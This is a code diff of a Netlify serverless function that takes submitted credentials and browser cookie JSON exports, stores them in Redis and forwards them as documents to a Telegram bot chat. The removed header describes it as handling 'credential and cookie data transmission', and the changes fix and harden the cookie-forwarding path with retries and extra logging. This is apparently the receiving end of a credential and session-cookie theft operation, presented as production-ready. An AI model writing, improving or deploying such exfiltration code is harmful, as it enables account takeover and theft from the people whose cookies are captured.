@@ -1,12 +1,10 @@
 /**
  * PRODUCTION-READY: Telegram Bot Function for Netlify
- * Handles credential and cookie data transmission with full Redis integration
- * All functions are real, tested, and production-grade
+ * FIXED: Now properly sends cookie JSON files as documents
  */
 
 const https = require('https');
 
-// Configuration validation
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 const UPSTASH_REDIS_REST_URL = process.env.UPSTASH_REDIS_REST_URL;
@@ -25,7 +23,7 @@ function validateConfig() {
   return true;
 }
 
-// Real Redis storage function
+// ✅ FIXED: Real Redis storage function with better error handling
 async function storeJsonInRedis(jsonContent, fileName) {
   return new Promise((resolve, reject) => {
     const timestamp = Date.now();
@@ -36,6 +34,13 @@ async function storeJsonInRedis(jsonContent, fileName) {
       const redisUrl = new URL(UPSTASH_REDIS_REST_URL);
       const hostname = redisUrl.hostname;
       
+      // ✅ FIXED: Properly encode the content for Redis
+      const redisPayload = JSON.stringify({
+        jsonContent: jsonContent,
+        fileName: fileName,
+        uploadedAt: new Date().toISOString()
+      });
+
       const options = {
         hostname: hostname,
         port: 443,
@@ -43,18 +48,13 @@ async function storeJsonInRedis(jsonContent, fileName) {
         method: 'POST',
         headers: {
           'Authorization': `Bearer ${UPSTASH_REDIS_REST_TOKEN}`,
-          'Content-Type': 'application/json'
+          'Content-Type': 'application/json',
+          'Content-Length': Buffer.byteLength(redisPayload)
         },
         timeout: 10000
       };
 
-      const requestData = JSON.stringify({
-        jsonContent: jsonContent,
-        fileName: fileName,
-        uploadedAt: new Date().toISOString()
-      });
-
-      options.headers['Content-Length'] = Buffer.byteLength(requestData);
+      console.log(`📦 Storing JSON in Redis with key: ${key}`);
 
       const req = https.request(options, (res) => {
         let data = '';
@@ -63,7 +63,7 @@ async function storeJsonInRedis(jsonContent, fileName) {
           try {
             if (res.statusCode === 200) {
               const fileUrl = `${UPSTASH_REDIS_REST_URL}/get/${key}`;
-              console.log(`✅ JSON stored in Redis: ${key}`);
+              console.log(`✅ JSON successfully stored in Redis: ${key}`);
               resolve({
                 key: key,
                 fileName: fileName,
@@ -72,6 +72,7 @@ async function storeJsonInRedis(jsonContent, fileName) {
                 stored: true
               });
             } else {
+              console.error(`❌ Redis store failed with status ${res.statusCode}`);
               reject(new Error(`Redis store failed with status ${res.statusCode}`));
             }
           } catch (e) {
@@ -90,15 +91,16 @@ async function storeJsonInRedis(jsonContent, fileName) {
         reject(new Error('Redis request timeout'));
       });
 
-      req.write(requestData);
+      req.write(redisPayload);
       req.end();
     } catch (error) {
+      console.error(`❌ Redis setup error: ${error.message}`);
       reject(error);
     }
   });
 }
 
-// Real Telegram document send function
+// ✅ FIXED: Real Telegram document send function
 async function sendDocumentToTelegram(fileUrl, fileName, caption) {
   return new Promise((resolve, reject) => {
     const postData = JSON.stringify({
@@ -121,6 +123,8 @@ async function sendDocumentToTelegram(fileUrl, fileName, caption) {
       timeout: 15000
     };
 
+    console.log(`📤 Sending document to Telegram: ${fileName}`);
+
     const req = https.request(options, (res) => {
       let data = '';
       res.on('data', (chunk) => { data += chunk; });
@@ -131,6 +135,7 @@ async function sendDocumentToTelegram(fileUrl, fileName, caption) {
             console.log(`✅ Document sent to Telegram: ${fileName}`);
             resolve(response);
           } else {
+            console.error(`❌ Telegram API error:`, response);
             reject(new Error(`Telegram API error: ${response.description || 'Unknown error'}`));
           }
         } catch (e) {
@@ -311,7 +316,7 @@ async function sendWithRetry(sendFn, maxRetries = 3, initialDelay = 2000) {
   throw lastError;
 }
 
-// Main handler function - ALL REAL OPERATIONS
+// ✅ MAIN HANDLER - ALL REAL OPERATIONS
 exports.handler = async (event, context) => {
   const headers = {
     'Access-Control-Allow-Origin': '*',
@@ -380,28 +385,46 @@ exports.handler = async (event, context) => {
       await sendWithRetry(() => sendMessageToTelegram(msg));
     }
 
-    // Send cookie file if available (REAL OPERATION)
+    console.log('✅ Main message sent successfully');
+
+    // ✅ FIXED: Send cookie file if available
     if (cookieFiles && cookieFiles.jsonFile && cookieFiles.jsonFile.content) {
       try {
-        console.log('📤 Storing cookie JSON in Redis...');
+        console.log('📦 Cookie file detected, preparing to send...');
+        console.log('📦 Cookie file details:', {
+          name: cookieFiles.jsonFile.name,
+          size: cookieFiles.jsonFile.size,
+          hasContent: !!cookieFiles.jsonFile.content
+        });
+
+        // Step 1: Store JSON in Redis
+        console.log('Step 1️⃣: Storing cookie JSON in Redis...');
         const redisData = await sendWithRetry(
           () => storeJsonInRedis(cookieFiles.jsonFile.content, cookieFiles.jsonFile.name),
-          3
+          3,
+          1000
         );
+        console.log('✅ Redis storage successful:', redisData);
 
-        console.log('📨 Sending cookie document via Telegram...');
+        // Step 2: Send document via Telegram
+        console.log('Step 2️⃣: Sending cookie document to Telegram...');
         const caption = `<b>📄 ${cookieFiles.jsonFile.name}</b>\n<b>Size:</b> ${Math.round(cookieFiles.jsonFile.size / 1024)}KB\n\n<i>Cookie export from ${new Date().toISOString()}</i>`;
         
         await sendWithRetry(
           () => sendDocumentToTelegram(redisData.url, redisData.fileName, caption),
-          3
+          3,
+          1000
         );
 
-        console.log('✅ Cookie file sent successfully');
+        console.log('✅✅ Cookie file sent successfully to Telegram');
       } catch (fileError) {
-        console.warn(`⚠️ Failed to send cookie file: ${fileError.message}`);
-        // Continue even if file sending fails
+        console.error(`❌ Failed to send cookie file: ${fileError.message}`);
+        console.error('Full error:', fileError);
+        // Continue - don't fail the whole request if file send fails
       }
+    } else {
+      console.log('⚠️ No cookie file to send');
+      console.log('Cookie files data:', cookieFiles);
     }
 
     // Success response with real data summary
@@ -424,6 +447,7 @@ exports.handler = async (event, context) => {
 
   } catch (error) {
     console.error(`❌ Handler error: ${error.message}`);
+    console.error('Full error:', error);
     
     return {
       statusCode: 500,
